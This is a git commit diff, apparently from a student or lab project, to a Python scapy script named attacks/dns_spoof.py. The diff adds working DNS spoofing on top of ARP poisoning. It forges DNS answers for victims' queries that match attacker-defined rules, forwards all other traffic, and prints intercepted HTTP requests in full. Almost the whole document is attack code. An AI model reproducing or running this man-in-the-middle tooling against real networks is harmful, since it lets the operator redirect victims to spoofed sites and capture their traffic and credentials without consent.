3ef0c46eb75cbc427b9490573927193a04cd66d4
Peter <p.heijstek@outlook.com>
2022-06-17 01:25:01 +0200

    wip

--- attacks/dns_spoof.py
+++ attacks/dns_spoof.py
@@ -1,7 +1,9 @@
 from attacks.arp_spoof import ARPAttackSettings
 from dataclasses import dataclass
 from scapy.all import *
+from scapy.layers.http import *
 from util import Interface
+
 
 @dataclass
 class DNSEntry:
@@ -29,14 +31,14 @@ def forward_packet(settings: ARPAttackSettings, packet: Packet):
        or (packet[IP].dst == interface.ip_addr)):
         return
 
-    print(f'Forwarding {packet.summary()}')
+    # print(f'Forwarding {packet.summary()}')
 
     # victim -> gateway
     for victim in victims:
         if packet[IP].src == victim.ip_addr:
             packet[Ether].src = interface.mac_addr
             packet[Ether].dst = gateway.mac_addr
-            print(f'As {packet.summary()}')
+            # print(f'As {packet.summary()}')
             sendp(packet, verbose=0)
             return
 
@@ -45,7 +47,7 @@ def forward_packet(settings: ARPAttackSettings, packet: Packet):
         if packet[IP].dst == victim.ip_addr:
             packet[Ether].src = interface.mac_addr
             packet[Ether].dst = victim.mac_addr
-            print(f'As {packet.summary()}')
+            # print(f'As {packet.summary()}')
             sendp(packet, verbose=0)
             return
 
@@ -57,23 +59,52 @@ def handle_packet(settings: DNSAttackSettings, packet: Packet):
     spoof the DNS request in the packet.
     """
 
+    if HTTPRequest in packet:
+        return handle_http(settings.arp_settings, packet)
+
     # We only handle packets that have UDP, IP and DNS protocols
     # Packet must contain DNS query and IP layer
     if not (DNS in packet and IP in packet and UDP in packet):
         return forward_packet(settings.arp_settings, packet)
 
     # check for dns standard query
-    # if packet[DNS].opcode != 0:
     if DNSQR not in packet:
         return forward_packet(settings.arp_settings, packet)
 
-    qry = packet[DNSQR]
+    interface = settings.arp_settings.interface
 
-    print(f'query: {qry}')
-    print(qry.qname)
-    print(qry.get_field('qtype').i2repr(qry, qry.qtype))
+    if Ether in packet and packet[Ether].src == interface.mac_addr:
+        return
 
+    query = packet[DNSQR]
+    url = query.qname.decode()
+    type = query.get_field('qtype').i2repr(query, query.qtype)
+
+    # try to match request with one of our rules
+    for rule in settings.dns_rules:
+        if is_match(url, type, rule):
+            packet[DNS].an = DNSRR(rrname=url, rdata=rule.ip)
+            packet[DNS].ancount = 1
+
+            response = Ether() / IP() / UDP() / packet[DNS]
+            response[Ether].src = interface.mac_addr
+            response[Ether].dst = packet[Ether].src
+            response[IP].src = packet[IP].dst
+            response[IP].dst = packet[IP].src
+            response[UDP].sport = packet[UDP].dport
+            response[UDP].dport = packet[UDP].sport
+
+            sendp(response, iface=interface.name, verbose=0)
+            return
+
+    # forward the packet if no rule matches
     forward_packet(settings.arp_settings, packet)
-    
-    # check queries
-    # DNS query must match
+
+def is_match(qname: str, type: str, dns_rule: DNSEntry):
+    if dns_rule.type == '*':
+        return qname.strip('.') == dns_rule.url.strip('.')
+    else:
+        return qname.strip('.') == dns_rule.url.strip('.') and type.upper() == dns_rule.type.upper()
+
+def handle_http(settings: ARPAttackSettings, packet: Packet):
+    print(packet[HTTPRequest].self_build().decode())
